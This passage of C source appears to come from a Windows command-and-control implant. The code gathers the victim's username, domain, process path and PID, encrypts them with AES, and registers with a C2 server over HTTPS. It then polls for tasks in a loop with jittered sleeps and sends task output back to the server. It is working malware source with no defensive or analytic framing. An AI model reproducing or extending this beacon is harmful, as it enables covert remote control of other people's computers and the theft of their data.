    if (pMultiByteToWideChar(CP_UTF8_VAL, 0, TS_SERVER, -1, wh, 256) < 1) { c2_t_winerr("host", "MultiByteToWideChar(TS_SERVER)"); free(k32); return; }
    c2_t("C2: TS_SERVER is wide (WinHTTP) OK");
    {
    char u[UNLEN + 1], d[UNLEN + 1], e[MAX_PATH], ps[32];
    exename_s(e, sizeof e);
    c2_t("C2: exename collected");
    if (pGetEnvironmentVariableA("USERDOMAIN", d, (DWORD)sizeof d) > 0) jesc(d, edom, sizeof edom);
    else jesc(".", edom, sizeof edom);
    { DWORD uu = (DWORD)sizeof u; u[0] = 0; if (!pGetUserNameA(u, &uu)) strcpy(u, "?"); } jesc(u, euser, sizeof euser);
    jesc(e, eex, sizeof eex);
    c2_t("C2: user/domain/process path escaped for JSON");
    _snprintf(ps, sizeof ps, "%lu", (unsigned long)pGetCurrentProcessId());
    jnreg = _snprintf(jbuf, sizeof jbuf, "{\"session\":\"%s\",\"ip\":\"%s\",\"username\":\"%s\",\"domain\":\"%s\","
    "\"os\":\"%s\",\"imp_pid\":\"%s\",\"process_name\":\"%s\",\"sleep\":\"%s\"}",
    TS_UUID, "{{SERVER_REPLACE_IP}}", euser, edom, "windows", ps, eex, TS_SLEEP);
    if (jnreg < 0 || (size_t)jnreg >= sizeof jbuf) { c2_t("FATAL: registration JSON too large for jbuf (len=%d cap=%zu)", jnreg, sizeof jbuf); free(k32); return; }
    jbuf[sizeof jbuf - 1] = 0;
    }
    c2_t("C2: registration JSON ready, %d byte(s) plaintext (excl. null)", jnreg);
    if (aes256_enc(k32, (unsigned char *)jbuf, (size_t)strlen(jbuf), &ct, &cl)) { c2_t("FATAL: AES encrypt of registration JSON failed (BCrypt)"); free(k32); return; }
    if (b64url_enc(ct, cl, &b64b, &b64l)) { c2_t("FATAL: base64 encode of registration blob failed (malloc)"); free(ct); free(k32); return; }
    free(ct); ct = NULL;
    c2_t("register JSON built, b64 request len=%zu", b64l);
    c2_t("C2: POST /js ...");
    _snprintf(hbuf, sizeof hbuf, "Content-Type: text/plain\r\nX-Unique-Identifier: %s\r\n", TS_UUID);
    h = 0; resp = NULL;
    if (https_post("POST /js", wh, (INTERNET_PORT)port, L"/js", hbuf, b64b, (DWORD)strlen(b64b), &resp, &h) != 0) { c2_t("FATAL: POST /js request failed"); free(b64b); free(k32); return; } free(b64b);
    if (h != 200 || !resp) { c2_t("FATAL: POST /js HTTP %lu (expected 200), resp=%p", h, (void *)resp); free(k32); free(resp); return; }
    c2_t("POST /js body preview: %.200s", resp);
    jstrip_str(resp, tok, sizeof tok); free(resp);
    if (!tok[0]) { c2_t("FATAL: could not parse session token from /js body"); free(k32); return; }
    c2_t("session token first 8 chars: %.8s (len %zu)", tok, strlen(tok));
    for (;;) {
    c2_t("--- poll: encrypt sleep JSON");
    _snprintf(sl, sizeof sl, "{\"sleep\":\"%s\"}", TS_SLEEP);
    b64b = NULL; resp = NULL; ct = NULL;
    if (aes256_enc(k32, (unsigned char *)sl, strlen(sl), &ct, &cl)) { c2_t("FATAL: AES /index body encrypt failed"); free(k32); return; }
    if (b64url_enc(ct, cl, &b64b, &b64l)) { c2_t("FATAL: b64 /index body failed (malloc)"); free(ct); free(k32); return; }
    free(ct); ct = NULL;
    _snprintf(hbuf, sizeof hbuf, "Content-Type: text/plain\r\nX-Session: %s\r\n", tok);
    h = 0; resp = NULL;
    if (https_post("POST /index", wh, (INTERNET_PORT)port, L"/index", hbuf, b64b, (DWORD)strlen(b64b), &resp, &h) != 0) { free(b64b); b64b = NULL;
        c2_t("POST /index failed, sleeping and retrying");
        { ULONGLONG te = pGetTickCount64(); unsigned S = (unsigned)atoi(TS_SLEEP), J = (unsigned)atoi(TS_JITTER);
        c2_backoff_sleep(morph, (DWORD)(S * 1000u + (J && S ? (unsigned)(te % (ULONGLONG)(S * J + 1u)) : 0))); }
        continue; } free(b64b); b64b = NULL;
    if (h != 200 || !resp) { c2_t("POST /index HTTP %lu, retrying after sleep (no 200 or empty body)", h); free(resp);
        { ULONGLONG te = pGetTickCount64(); unsigned S = (unsigned)atoi(TS_SLEEP), J = (unsigned)atoi(TS_JITTER);
        c2_backoff_sleep(morph, (DWORD)(S * 1000u + (J && S ? (unsigned)(te % (ULONGLONG)(S * J + 1u)) : 0))); }
        continue; }
    c2_t("POST /index text preview: %.300s", resp);
    g_c2coll.tcsv[0] = 0; g_c2coll.pout = g_c2coll.out; g_c2coll.out[0] = 0; g_c2coll.first = 1; walk_json_strings(resp, on_task, &g_c2coll);
    free(resp);
    if (g_c2coll.tcsv[0]) { size_t jbl, need; int jret;
        g_tesc_t[0] = 0; g_tesc_o[0] = 0; jesc(g_c2coll.tcsv, g_tesc_t, sizeof g_tesc_t); jesc(g_c2coll.out, g_tesc_o, sizeof g_tesc_o);
        jbl = strlen(tok) + strlen(g_tesc_t) + strlen(g_tesc_o) + 128;
        need = (jbl < 2100000u ? 2100000u : jbl) + 4u; jb = (char *)malloc(need);
        b64b = NULL; resp = NULL; ct = NULL;
        if (!jb) { c2_t("return_out: malloc for JSON failed"); }
        else {
        jret = _snprintf(jb, need, "{\"session\":\"%s\",\"task_name\":\"%s\",\"output\":\"%s\"}", tok, g_tesc_t, g_tesc_o);
        if (jret < 0 || (size_t)jret >= need) { c2_t("return_out: task JSON too large (snprintf)"); }
        else if (aes256_enc(k32, (unsigned char *)jb, (size_t)strlen(jb), &ct, &cl) == 0) {
        if (b64url_enc(ct, cl, &b64b, &b64l)) { c2_t("return_out: b64 failed"); free(ct); ct = NULL; }
        else {
        free(ct); ct = NULL;
        _snprintf(hbuf, sizeof hbuf, "Content-Type: text/plain\r\nX-Session: %s\r\n", tok);
        h = 0; resp = NULL;
        if (https_post("POST /return_out", wh, (INTERNET_PORT)port, L"/return_out", hbuf, b64b, (DWORD)strlen(b64b), &resp, &h) == 0) {
            c2_t("return_out HTTP %lu", h); free(resp); resp = NULL;
        } else { c2_t("return_out: request failed"); free(resp); resp = NULL; }
        free(b64b); b64b = NULL;
        } } else c2_t("return_out: AES encrypt failed");
        free(jb); jb = NULL; }
    }
    { ULONGLONG t0 = pGetTickCount64(); unsigned S = (unsigned)atoi(TS_SLEEP), J = (unsigned)atoi(TS_JITTER);
    c2_backoff_sleep(morph, (DWORD)(S * 1000u + (J && S ? (unsigned)(t0 % (ULONGLONG)(S * J + 1u)) : 0))); }
    }
}
